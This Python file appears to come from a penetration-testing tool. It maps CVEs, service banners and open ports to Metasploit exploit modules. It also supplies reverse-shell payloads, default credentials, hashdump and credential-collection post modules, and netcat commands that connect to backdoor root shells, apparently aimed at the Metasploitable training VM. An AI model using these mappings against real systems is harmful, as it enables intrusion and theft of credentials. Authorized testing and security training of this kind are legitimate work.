"""
Rule-based attack planner.
Maps findings (CVEs, service versions, port/service patterns) to Metasploit modules.
No LLM required.
"""
from __future__ import annotations
import re
from dataclasses import dataclass, field


@dataclass
class ModuleRec:
    module: str
    payload: str
    options: dict[str, str]
    description: str
    confidence: str          # high | medium | low
    match_reason: str
    finding_title: str = ""
    finding_severity: str = ""
    post_modules: list[str] = field(default_factory=list)


# ── CVE → module ──────────────────────────────────────────────────────────────

CVE_MAP: dict[str, dict] = {
    # vsftpd 2.3.4 backdoor
    "CVE-2011-2523": {
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "payload": "",
        "options": {"RPORT": "21"},
        "description": "vsftpd 2.3.4 contains a backdoor introduced via a compromised source tarball. Connecting to port 21 with a smiley-face username triggers a root shell on port 6200.",
        "confidence": "high",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    # UnrealIRCd backdoor
    "CVE-2010-2075": {
        "module": "exploit/unix/irc/unreal_ircd_3281_backdoor",
        "payload": "cmd/unix/reverse",
        "options": {"RPORT": "6667"},
        "description": "UnrealIRCd 3.2.8.1 shipped with a backdoor in the DEBUG3_DOLOG_SYSTEM macro. Sending AB followed by a system command executes it as the IRCd user.",
        "confidence": "high",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    # Samba usermap_script
    "CVE-2007-2447": {
        "module": "exploit/multi/samba/usermap_script",
        "payload": "cmd/unix/reverse",
        "options": {"RPORT": "139"},
        "description": "Samba 3.0.20–3.0.25rc3 allows remote code execution via shell metacharacters in the username during MS-RPC authentication when using non-default 'username map script' config.",
        "confidence": "high",
        "post": ["post/multi/manage/shell_to_meterpreter", "post/linux/gather/hashdump"],
    },
    # distcc
    "CVE-2004-2687": {
        "module": "exploit/unix/misc/distcc_exec",
        "payload": "cmd/unix/reverse",
        "options": {"RPORT": "3632"},
        "description": "distcc 2.x allows remote code execution by distributing compilation jobs containing arbitrary commands.",
        "confidence": "high",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    # PHP CGI argument injection
    "CVE-2012-1823": {
        "module": "exploit/multi/http/php_cgi_arg_injection",
        "payload": "php/meterpreter/reverse_tcp",
        "options": {"RPORT": "80"},
        "description": "PHP 5.4 < 5.4.3 and 5.3 < 5.3.13 allows remote code execution via CGI argument injection.",
        "confidence": "high",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    # Tomcat manager
    "CVE-2009-3843": {
        "module": "exploit/multi/http/tomcat_mgr_upload",
        "payload": "java/meterpreter/reverse_tcp",
        "options": {"RPORT": "8180", "HttpUsername": "tomcat", "HttpPassword": "tomcat"},
        "description": "Apache Tomcat manager application allows WAR file upload leading to code execution.",
        "confidence": "medium",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    # Java RMI
    "CVE-2011-3556": {
        "module": "exploit/multi/misc/java_rmi_server",
        "payload": "java/meterpreter/reverse_tcp",
        "options": {"RPORT": "1099", "SRVPORT": "35567"},
        "description": "Java RMI Server insecure deserialization allows remote code execution.",
        "confidence": "high",
        "post": [],
    },
    # Postgres
    "CVE-2007-3280": {
        "module": "exploit/linux/postgres/postgres_payload",
        "payload": "linux/x86/meterpreter/reverse_tcp",
        "options": {"RPORT": "5432", "USERNAME": "postgres", "PASSWORD": "postgres"},
        "description": "PostgreSQL allows authenticated users to execute OS commands via COPY TO/FROM PROGRAM.",
        "confidence": "medium",
        "post": ["post/linux/gather/hashdump"],
    },
    # Apache mod_cgi shellshock
    "CVE-2014-6271": {
        "module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "payload": "linux/x86/meterpreter/reverse_tcp",
        "options": {"RPORT": "80", "TARGETURI": "/cgi-bin/status"},
        "description": "Bash Shellshock vulnerability allows remote code execution via HTTP headers in CGI scripts.",
        "confidence": "high",
        "post": [],
    },
    # Drupal
    "CVE-2014-3704": {
        "module": "exploit/multi/http/drupal_drupageddon",
        "payload": "php/meterpreter/reverse_tcp",
        "options": {"RPORT": "80"},
        "description": "Drupal 7 SQL injection (Drupageddon) allows admin account creation and code execution.",
        "confidence": "high",
        "post": [],
    },
    # MS08-067
    "CVE-2008-4250": {
        "module": "exploit/windows/smb/ms08_067_netapi",
        "payload": "windows/meterpreter/reverse_tcp",
        "options": {"RPORT": "445"},
        "description": "Windows Server Service RPC vulnerability allows unauthenticated remote code execution.",
        "confidence": "high",
        "post": ["post/windows/gather/hashdump", "post/windows/gather/credentials/credential_collector"],
    },
    # EternalBlue
    "CVE-2017-0144": {
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "options": {"RPORT": "445"},
        "description": "SMBv1 vulnerability used by WannaCry/NotPetya. Allows unauthenticated SYSTEM-level code execution.",
        "confidence": "high",
        "post": ["post/windows/gather/hashdump", "post/windows/manage/migrate"],
    },
    # Heartbleed
    "CVE-2014-0160": {
        "module": "auxiliary/scanner/ssl/openssl_heartbleed",
        "payload": "",
        "options": {"RPORT": "443", "ACTION": "DUMP"},
        "description": "OpenSSL Heartbleed leaks memory from the server process, potentially exposing keys and credentials.",
        "confidence": "high",
        "post": [],
    },
}

# ── Port/service keyword → module (fallback when no CVE) ─────────────────────

SERVICE_MAP: list[dict] = [
    {
        "keywords": ["vsftpd 2.3.4", "vsftpd_234", "vsftpd234"],
        "ports": {21},
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "payload": "",
        "options": {"RPORT": "21"},
        "description": "vsftpd 2.3.4 backdoor detected by version string.",
        "confidence": "high",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    {
        "keywords": ["unreal", "unrealircd", "irc"],
        "ports": {6667, 6697},
        "module": "exploit/unix/irc/unreal_ircd_3281_backdoor",
        "payload": "cmd/unix/reverse",
        "options": {"RPORT": "6667"},
        "description": "UnrealIRCd service detected — check if version is 3.2.8.1 which contains a backdoor.",
        "confidence": "medium",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    {
        "keywords": ["samba", "smb", "netbios", "cifs"],
        "ports": {139, 445},
        "module": "exploit/multi/samba/usermap_script",
        "payload": "cmd/unix/reverse",
        "options": {"RPORT": "139"},
        "description": "Samba service detected. Older versions vulnerable to usermap_script RCE.",
        "confidence": "medium",
        "post": ["post/multi/manage/shell_to_meterpreter", "post/linux/gather/hashdump"],
    },
    {
        "keywords": ["distcc"],
        "ports": {3632},
        "module": "exploit/unix/misc/distcc_exec",
        "payload": "cmd/unix/reverse",
        "options": {"RPORT": "3632"},
        "description": "distcc daemon detected on port 3632.",
        "confidence": "high",
        "post": ["post/multi/manage/shell_to_meterpreter"],
    },
    {
        "keywords": ["tomcat", "apache tomcat"],
        "ports": {8080, 8180, 8443},
        "module": "exploit/multi/http/tomcat_mgr_upload",
        "payload": "java/meterpreter/reverse_tcp",
        "options": {"RPORT": "8180", "HttpUsername": "tomcat", "HttpPassword": "tomcat"},
        "description": "Apache Tomcat manager detected. Default credentials often work on older installs.",
        "confidence": "medium",
        "post": [],
    },
    {
        "keywords": ["java rmi", "rmiregistry", "java remote"],
        "ports": {1099},
        "module": "exploit/multi/misc/java_rmi_server",
        "payload": "java/meterpreter/reverse_tcp",
        "options": {"RPORT": "1099"},
        "description": "Java RMI registry detected on port 1099.",
        "confidence": "high",
        "post": [],
    },
    {
        "keywords": ["postgresql", "postgres"],
        "ports": {5432},
        "module": "exploit/linux/postgres/postgres_payload",
        "payload": "linux/x86/meterpreter/reverse_tcp",
        "options": {"RPORT": "5432", "USERNAME": "postgres", "PASSWORD": "postgres"},
        "description": "PostgreSQL detected. Try default credentials and COPY PROGRAM execution.",
        "confidence": "medium",
        "post": ["post/linux/gather/hashdump"],
    },
    {
        "keywords": ["mysql"],
        "ports": {3306},
        "module": "auxiliary/scanner/mysql/mysql_login",
        "payload": "",
        "options": {"RPORT": "3306", "USERNAME": "root", "BLANK_PASSWORDS": "true"},
        "description": "MySQL detected. Attempt login with empty root password (common on Metasploitable).",
        "confidence": "medium",
        "post": [],
    },
    {
        "keywords": ["bindshell", "bind shell", "backdoor shell", "ingreslock"],
        "ports": {1524},
        "module": "— (direct connect)",
        "payload": "",
        "options": {},
        "description": "Port 1524 (ingreslock) is a classic Metasploitable backdoor root shell. Connect directly: nc <target> 1524",
        "confidence": "high",
        "post": [],
    },
    {
        "keywords": ["telnet"],
        "ports": {23},
        "module": "auxiliary/scanner/telnet/telnet_login",
        "payload": "",
        "options": {"RPORT": "23", "USERNAME": "msfadmin", "PASSWORD": "msfadmin"},
        "description": "Telnet service detected. Try default credentials.",
        "confidence": "medium",
        "post": [],
    },
    {
        "keywords": ["smtp", "sendmail", "postfix", "exim"],
        "ports": {25},
        "module": "auxiliary/scanner/smtp/smtp_enum",
        "payload": "",
        "options": {"RPORT": "25"},
        "description": "SMTP service detected. Enumerate users via VRFY/EXPN.",
        "confidence": "low",
        "post": [],
    },
    {
        "keywords": ["php", "cgi", "php-cgi"],
        "ports": {80, 443, 8080},
        "module": "exploit/multi/http/php_cgi_arg_injection",
        "payload": "php/meterpreter/reverse_tcp",
        "options": {"RPORT": "80"},
        "description": "PHP CGI detected. Vulnerable versions allow argument injection RCE.",
        "confidence": "medium",
        "post": [],
    },
    {
        "keywords": ["nfs", "rpc", "mountd"],
        "ports": {2049, 111},
        "module": "auxiliary/scanner/nfs/nfsmount",
        "payload": "",
        "options": {"RPORT": "2049"},
        "description": "NFS/RPC service detected. Check for world-readable exports.",
        "confidence": "low",
        "post": [],
    },
    {
        "keywords": ["vnc"],
        "ports": {5900, 5901},
        "module": "auxiliary/scanner/vnc/vnc_login",
        "payload": "",
        "options": {"RPORT": "5900", "PASSWORD": "password"},
        "description": "VNC service detected. Try blank or default passwords.",
        "confidence": "medium",
        "post": [],
    },
    {
        "keywords": ["ssh"],
        "ports": {22},
        "module": "auxiliary/scanner/ssh/ssh_login",
        "payload": "",
        "options": {"RPORT": "22", "USERNAME": "msfadmin", "PASSWORD": "msfadmin"},
        "description": "SSH service detected. Try default credentials.",
        "confidence": "low",
        "post": [],
    },
]

# ── Port-only fallback (no keyword match needed) ───────────────────────────────

PORT_FALLBACK: dict[int, dict] = {
    1524: {
        "module": "— (direct connect)",
        "payload": "",
        "options": {},
        "description": "Port 1524 is the Metasploitable ingreslock backdoor. Run: nc <target> 1524",
        "confidence": "high",
        "post": [],
    },
    6200: {
        "module": "— (direct connect)",
        "payload": "",
        "options": {},
        "description": "Port 6200 is typically opened by the vsftpd 2.3.4 backdoor after triggering. Run: nc <target> 6200",
        "confidence": "high",
        "post": [],
    },
}


_SS_TITLE_RE = re.compile(r"(\d+)\s+exploit\(s\)\s+found\s+for\s+(.+)", re.IGNORECASE)
_CVE_RE = re.compile(r"CVE-\d{4}-\d+", re.IGNORECASE)


def _parse_searchsploit_findings(findings) -> list[dict]:
    """Extract service name and embedded CVEs from searchsploit-generated findings."""
    results = []
    for f in findings:
        m = _SS_TITLE_RE.search(f.title or "")
        if not m:
            continue
        edb_count = int(m.group(1))
        service = m.group(2).strip()
        cves = {c.upper() for c in _CVE_RE.findall(f.evidence or "")}
        results.append({
            "finding": f,
            "service": service,
            "cves": cves,
            "edb_count": edb_count,
        })
    return results


def _normalise(text: str) -> str:
    return text.lower().replace("-", " ").replace("_", " ")


def _extract_ports(ports_str: str) -> set[int]:
    """Parse a comma/space separated ports string into a set of ints."""
    ports = set()
    if not ports_str:
        return ports
    for token in ports_str.replace(",", " ").split():
        token = token.split("/")[0]  # strip /tcp /udp
        try:
            ports.add(int(token))
        except ValueError:
            pass
    return ports


_REVERSE_PAYLOAD_MARKERS = ("reverse", "reverse_tcp", "reverse_http", "reverse_https")


def plan(targets, findings, lhost: str = "") -> dict:
    """
    targets: list of Target ORM objects
    findings: list of Finding ORM objects
    Returns structured attack plan dict.
    """
    recommendations: list[dict] = []
    seen_modules: set[str] = set()

    def _add(rec: dict, finding_title: str, finding_severity: str):
        key = rec["module"]
        if key in seen_modules:
            return
        seen_modules.add(key)
        recommendations.append({**rec, "finding_title": finding_title, "finding_severity": finding_severity})

    # Build target port lookup
    target_ports: set[int] = set()
    for t in targets:
        target_ports |= _extract_ports(t.ports or "")

    # 1. CVE matches (highest confidence)
    for f in findings:
        if not f.cve_id:
            continue
        cve = f.cve_id.upper().strip()
        if cve in CVE_MAP:
            entry = CVE_MAP[cve]
            _add({
                "module": entry["module"],
                "payload": entry["payload"],
                "options": entry["options"],
                "description": entry["description"],
                "confidence": entry["confidence"],
                "match_reason": f"CVE match: {cve}",
                "post_modules": entry.get("post", []),
            }, f.title, f.severity)

    # 1b. Searchsploit findings — mine CVEs from evidence and match service keywords
    for ss in _parse_searchsploit_findings(findings):
        f = ss["finding"]
        reason_suffix = f"Exploit-DB: {ss['edb_count']} public exploit(s) for {ss['service']}"

        # CVEs embedded in exploit titles → CVE_MAP (high confidence)
        for cve in ss["cves"]:
            if cve not in CVE_MAP:
                continue
            entry = CVE_MAP[cve]
            _add({
                "module": entry["module"],
                "payload": entry["payload"],
                "options": entry["options"],
                "description": entry["description"],
                "confidence": "high",
                "match_reason": f"{cve} confirmed by {reason_suffix}",
                "post_modules": entry.get("post", []),
            }, f.title, f.severity)

        # Service name → SERVICE_MAP keyword match (medium confidence)
        service_norm = _normalise(ss["service"])
        for rule in SERVICE_MAP:
            if rule["module"] in seen_modules:
                continue
            if any(kw in service_norm for kw in rule["keywords"]):
                opts = rule["options"].copy()
                _add({
                    "module": rule["module"],
                    "payload": rule["payload"],
                    "options": opts,
                    "description": rule["description"],
                    "confidence": "medium",
                    "match_reason": reason_suffix,
                    "post_modules": rule.get("post", []),
                }, f.title, f.severity)

    # 2. Keyword matches from finding title/description
    for f in findings:
        text = _normalise(f.title or "") + " " + _normalise(f.description or "")
        for rule in SERVICE_MAP:
            if rule["module"] in seen_modules:
                continue
            if any(kw in text for kw in rule["keywords"]):
                _add({
                    "module": rule["module"],
                    "payload": rule["payload"],
                    "options": rule["options"].copy(),
                    "description": rule["description"],
                    "confidence": rule["confidence"],
                    "match_reason": f"Service keyword in finding: \"{f.title}\"",
                    "post_modules": rule.get("post", []),
                }, f.title, f.severity)

    # 3. Port-only matches (from target port scan results)
    for port in sorted(target_ports):
        # Direct port fallback
        if port in PORT_FALLBACK and PORT_FALLBACK[port]["module"] not in seen_modules:
            entry = PORT_FALLBACK[port]
            _add({
                "module": entry["module"],
                "payload": entry["payload"],
                "options": entry["options"],
                "description": entry["description"],
                "confidence": entry["confidence"],
                "match_reason": f"Open port {port} detected on target",
                "post_modules": entry.get("post", []),
            }, f"Open port {port}", "info")
        # Service map port match
        for rule in SERVICE_MAP:
            if rule["module"] in seen_modules:
                continue
            if port in rule.get("ports", set()):
                opts = rule["options"].copy()
                opts["RPORT"] = str(port)
                _add({
                    "module": rule["module"],
                    "payload": rule["payload"],
                    "options": opts,
                    "description": rule["description"],
                    "confidence": "low",
                    "match_reason": f"Open port {port} matches known service",
                    "post_modules": rule.get("post", []),
                }, f"Open port {port}", "info")

    # Sort: high confidence first, then by finding severity
    SEV = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    CONF = {"high": 0, "medium": 1, "low": 2}
    recommendations.sort(key=lambda r: (CONF.get(r["confidence"], 9), SEV.get(r["finding_severity"], 9)))

    # Set RHOSTS on all recs that are missing it
    if targets:
        default_host = targets[0].hostname_or_ip
        for r in recommendations:
            if "RHOSTS" not in r["options"] and "RHOST" not in r["options"]:
                r["options"]["RHOSTS"] = default_host

    # Set LHOST on reverse-payload modules
    for r in recommendations:
        payload = r.get("payload", "")
        if any(m in payload for m in _REVERSE_PAYLOAD_MARKERS):
            if "LHOST" not in r["options"]:
                r["options"]["LHOST"] = lhost

    unmatched = [
        {"title": f.title, "severity": f.severity, "cve_id": f.cve_id}
        for f in findings
        if not any(
            (f.cve_id and f.cve_id.upper() in CVE_MAP) or
            any(kw in _normalise(f.title or "") + " " + _normalise(f.description or "")
                for kw in rule["keywords"])
            for rule in SERVICE_MAP
        )
    ]

    return {
        "recommendations": recommendations,
        "unmatched_findings": unmatched[:20],
        "target_count": len(targets),
        "finding_count": len(findings),
        "matched_count": len(recommendations),
    }
